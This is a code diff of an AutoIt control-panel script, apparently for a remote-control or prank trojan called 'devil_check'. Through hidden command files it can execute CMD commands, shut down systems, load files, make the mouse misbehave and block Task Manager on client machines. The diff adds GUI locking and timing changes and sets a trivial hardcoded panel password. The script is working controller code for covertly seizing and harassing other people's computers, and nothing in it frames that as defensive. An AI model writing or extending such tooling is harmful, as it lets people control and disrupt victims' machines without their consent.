@@ -19,7 +19,7 @@
 _Singleton("devil_check_controlpanel", 0)
 
 ; Variables
-Local $Password = "qwerty" ; There must be a password for accessing the command panel!
+Local $Password = "123" ; There must be a password for accessing the command panel!
 Global $ClientID = ""
 
 ; Exit hotkey
@@ -69,21 +69,37 @@ While True
 		Case $GUI_EVENT_CLOSE
 			Exit
         Case $ShowMessageBox_Button
+            LockGUI()
             ShowMessageBox()
+            UnLockGUI()
         Case $ExecuteToCMD_Button
+            LockGUI()
             ExecuteToCMD()
+            UnLockGUI()
         Case $SystemShutdown_Button
+            LockGUI()
             SystemShutdown()
+            UnLockGUI()
         Case $LoadFile_Button
+            LockGUI()
             LoadFile()
+            UnLockGUI()
         Case $CrazyMouse_EnableButton
+            LockGUI()
             EnableCrazyMouse()
+            UnLockGUI()
         Case $CrazyMouse_DisableButton
+            LockGUI()
             DisableCrazyMouse()
+            UnLockGUI()
         Case $BlockTaskManager_EnableButton
+            LockGUI()
             EnableBlockTaskManager()
+            UnLockGUI()
         Case $BlockTaskManager_DisableButton
+            LockGUI()
             DisableBlockTaskManager()
+            UnLockGUI()
 	EndSwitch
 WEnd
 
@@ -99,7 +115,7 @@ Func ShowMessageBox()
         Local $Temp_DataFile = FileOpen($Server_Directory & "\" & $ClientID & "_temp", $FO_APPEND)
         FileSetAttrib($Server_Directory & "\" & $ClientID & "_temp", "+H")
         FileWriteLine($Temp_DataFile, "[Data]")
-        FileWriteLine($Temp_DataFile, "Type=message")
+        FileWriteLine($Temp_DataFile, "Type=show_message")
         FileWriteLine($Temp_DataFile, "Command=" & $MessageBox_Text)
         FileCopy($Server_Directory & "\" & $ClientID & "_temp", $Server_Directory & "\" & $ClientID, $FC_OVERWRITE)
         FileDelete($Server_Directory & "\" & $ClientID & "_temp")
@@ -166,7 +182,7 @@ Func LoadFile()
         FileDelete($Server_Directory & "\" & $ClientID & "_temp")
         FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
         FileClose($Temp_DataFile)
-        Sleep(1000) 
+        Sleep(3000) 
     EndIf
 EndFunc
 
@@ -185,7 +201,7 @@ Func EnableCrazyMouse()
         FileDelete($Server_Directory & "\" & $ClientID & "_temp")
         FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
         FileClose($Temp_DataFile)
-        Sleep(1000) 
+        Sleep(500) 
     EndIf
 EndFunc
 
@@ -204,7 +220,7 @@ Func DisableCrazyMouse()
         FileDelete($Server_Directory & "\" & $ClientID & "_temp")
         FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
         FileClose($Temp_DataFile)
-        Sleep(1000) 
+        Sleep(500) 
     EndIf
 EndFunc
 
@@ -223,7 +239,7 @@ Func EnableBlockTaskManager()
         FileDelete($Server_Directory & "\" & $ClientID & "_temp")
         FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
         FileClose($Temp_DataFile)
-        Sleep(1000) 
+        Sleep(500) 
     EndIf
 EndFunc
 
@@ -242,10 +258,37 @@ Func DisableBlockTaskManager()
         FileDelete($Server_Directory & "\" & $ClientID & "_temp")
         FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
         FileClose($Temp_DataFile)
-        Sleep(1000) 
+        Sleep(500) 
     EndIf
 EndFunc
 
+; Lock gui elements
+Func LockGUI()
+    GUICtrlSetState($ShowMessageBox_Button, $GUI_DISABLE)
+    GUICtrlSetState($ExecuteToCMD_Button, $GUI_DISABLE)
+    GUICtrlSetState($SystemShutdown_Button, $GUI_DISABLE)
+    GUICtrlSetState($LoadFile_Button, $GUI_DISABLE)
+    GUICtrlSetState($CrazyMouse_EnableButton, $GUI_DISABLE)
+    GUICtrlSetState($CrazyMouse_DisableButton, $GUI_DISABLE)
+    GUICtrlSetState($BlockTaskManager_EnableButton, $GUI_DISABLE)
+    GUICtrlSetState($BlockTaskManager_DisableButton, $GUI_DISABLE)
+    GUICtrlSetState($InputBox, $GUI_DISABLE)
+EndFunc
+
+; Unlock gui elements
+Func UnLockGUI()
+    GUICtrlSetState($ShowMessageBox_Button, $GUI_ENABLE)
+    GUICtrlSetState($ExecuteToCMD_Button, $GUI_ENABLE)
+    GUICtrlSetState($SystemShutdown_Button, $GUI_ENABLE)
+    GUICtrlSetState($LoadFile_Button, $GUI_ENABLE)
+    GUICtrlSetState($CrazyMouse_EnableButton, $GUI_ENABLE)
+    GUICtrlSetState($CrazyMouse_DisableButton, $GUI_ENABLE)
+    GUICtrlSetState($BlockTaskManager_EnableButton, $GUI_ENABLE)
+    GUICtrlSetState($BlockTaskManager_DisableButton, $GUI_ENABLE)
+    GUICtrlSetState($InputBox, $GUI_ENABLE)
+EndFunc
+
+; Exit
 Func FastClosing()
     Exit
 EndFunc
